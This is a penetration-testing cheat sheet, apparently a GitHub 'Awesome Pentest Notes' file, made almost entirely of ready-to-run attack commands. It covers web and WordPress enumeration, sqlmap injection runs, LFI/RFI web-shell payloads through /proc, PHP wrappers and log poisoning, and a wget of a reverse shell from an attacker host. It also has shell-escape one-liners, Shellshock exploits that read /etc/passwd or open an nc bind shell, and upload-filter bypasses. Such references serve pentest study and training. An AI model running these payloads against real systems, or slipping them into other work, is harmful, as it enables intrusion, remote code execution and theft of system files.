# Awesome Pentest Notes

***

Table of Contents
=================


 * [NMAP Scan](#-nmap-scan)
 * [Web App Scan](#-web-app-scan)
 * [Wordpress Attacks](#-Wordpress-Attacks)
 * [SQL Injection](#-SQL-Injection)
 * [RFI/LFI Technics](#-rfi-lfi)
 * [Shell Escaping](#-Shell-Escaping)
 * [Exploiting Shellshock](#-Exploiting-Shellshock)
 * [File Upload Bypass Technics](#-File-Upload-Bypass-Technics)

 ## [↑](#table-of-contents) NMAP Scan
 ```
 ```
 ## [↑](#table-of-contents) Web App Scan
 ```
 * Dirb
 >> Specifi file extention
 dirb http://10.10.10.56/cgi-bin -X .sh
 dirb http://$target /usr/share/wordlists/dirb/common.txt
 
 * Dirbuster
 dirbuster -u https://192.168.216.131 -H -v -l /usr/share/dirb/wordlists/common.txt

 ```
 ## [↑](#table-of-contents) Wordpress Attacks
 ```
 * WPScan
 wpscan –u http://derpnstink.local/weblog/ --enumerate t --enumerate u
 
 
 ```
 ## [↑](#table-of-contents) SQL Injection
 ```
 * SQLMAP Example - http://niiconsulting.com/checkmate/2014/01/from-sql-injection-to-0wnage-using-sqlmap/
 sqlmap -u 'http://helpdesk.test.lab/login.php' --data='username=username&password=password&submit=Enter' --level=5 --risk=3 --batch
sqlmap -u 'http://192.168.254.129:1337/978345210/index.php' --forms --level=5 --risk=3 --batch
 ```
 
  ## [↑](#table-of-contents) RFI/LFI Technics
  ### PROC Environment
  ```
  - /proc/self/environ 
  Inject HTTP_USER_AGENT as <?php system($_GET[‘cmd’]); ?> […]/fi/?page=/proc/self/environ&cmd=ls
  
  - /proc/self/fd 
  Inject HTTP_USER_AGENT as <?php system($_GET[‘cmd’]); ?> […]/fi/?page=/proc/self/fd&cmd=pwd
  ```
  
  ### PHP Wrapper
  ```
  - PHP://filter
  ?file=php://filter/read=convert.base64-encode/resource=../../config.php
  
  - Expect://
  ?page=expect://ls
  
  - Data://
  […]/fi/?page=data:text/plain,<?system($_GET['x']);?>&x=ls%00 […]/fi/?page=data:,<?system($_GET['cmd']);?>&x=ls%00 […]/fi/?page=data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls%00
  
 
  ```
  ### PHP://input (POST method)
  ```
  - PHP://input (POST method)
  URL www.pentest.local/fileincl/vul.php?page=php://input 
  On Burp "Enable Post Data" <? system('wget http://kali/php-reverse-shell.php -O /var/www/shell.php')
  ```
  ### Log Poisoning to LFI
  ```
  - Inject PHP Shell to Apache log
  $ nc <target_ip> 80 GET /<?php system(&_GET['cmd']); ?> Browse to vulnerable page: […]/fi/?page=/var/log/apache.log&cmd=ls
  
  - Inject PHP Shell to Mail log
  $ mail -s "Hello: <?php system($_GET['cmd']); ?>" pentest@pentest.local < /dev/null 
  Browse to vulnerable page: […]/fi/?page=/var/log/mail.log&cmd=ls
  
  - Inject PHP Shell to SSH log
  $ ssh <? php system($_GET['cmd']);?>@<target_ip> Browse to vulnerable page: […]/fi/?page=/var/log/auth.log&cmd=ls
  
  ```
## [↑](#table-of-contents) Shell Escaping
### Using Text Editor
```
VI --> :!bash
VI --> :set shell=/bin/bash:shell

VIM-->  !/bin/sh or !/bin/bash or vim -c '!sh'

Pico --> pico -s "/bin/bash" then you can write /bin/bash and then CTRL + T

Less --> less file then !sh

More --> more file then !sh
```
### Programing Languages Techniques
```
AWK --> awk 'BEGIN {system("/bin/bash")}'

Find --> find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;

Perl --> perl -e 'exec "/bin/bash";'

Python --> python -c ‘import pty; pty.spawn(“/bin/sh”)’
Python --> python -c ‘import pty; pty.spawn(“/bin/bash”)’

EXCEPT --> except spawn sh then sh

PHP --> php - a then exec("sh -i");

LUA --> os.execute('/bin/sh')

Ruby --> exec "/bin/sh"
```
### SSH Techniques
```
ssh username@IP -t "/bin/sh" or "/bin/bash"
ssh username@IP -t "bash --noprofile"
ssh username@IP -t "() { :; }; /bin/bash"
```
### Using other software
```
FTP --> !/bin/sh or !/bin/bash
SCP --> -S /path/yourscript x y:

GDB --> !/bin/sh or !/bin/bash

GIT --> git help status > you can run it then !/bin/bash
ZIP --> zip /tmp/test.zip /tmp/test -T --unzip -command="sh -c /bin/bash"

TAR --> tar cf /dev/null testfile --checkpoint=1 --checkpoint -action=exec=/bin/bash

NMAP --> nmap --interactive then !sh

MAN --> man man then !sh
```

## [↑](#table-of-contents) Exploiting Shellshock
###  Exploiting CGI-BIN
```
git clone https://github.com/nccgroup/shocker

./shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c

/cgi-bin/status --verbose


SSH Forced Command

Check for forced command by enabling all debug output with ssh

$ ssh -vvv

$ ssh -i noob noob@$ip '() { :;}; /bin/bash'


cat file (view file contents)

echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {

:;}; echo \\$(</etc/passwd)\\r\\nHost:

vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80


Shell Shock run bind shell

echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {

:;}; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost:

vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80
```


## [↑](#table-of-contents) File Upload Bypass Technics
### Null Character
```
Upload file as shell.php%00.jpg or shell.php%00.png
```
### Double Extension injection
```
Upload file as shell.php.png

In Burp - Change filename='shell.php'
```
### Content Type Manipulation
```
In Burp - Change Content-Type: image/png
```
### File Extension Manipulation
```
Using capital letters like : file.aSp or file.PhP or file.PHp3 file.PhP5 or file.PhT

Using trailing spaces and/or dots at the end of the filename like : file.asp… … . . .. .. , file.asp , file.asp.

Using semicolon bypass like : file.asp;.jpg (Only in IIS 6 or prior)

Using forbidden extension like :  file.asp:.jpg or file.asp::$data
```
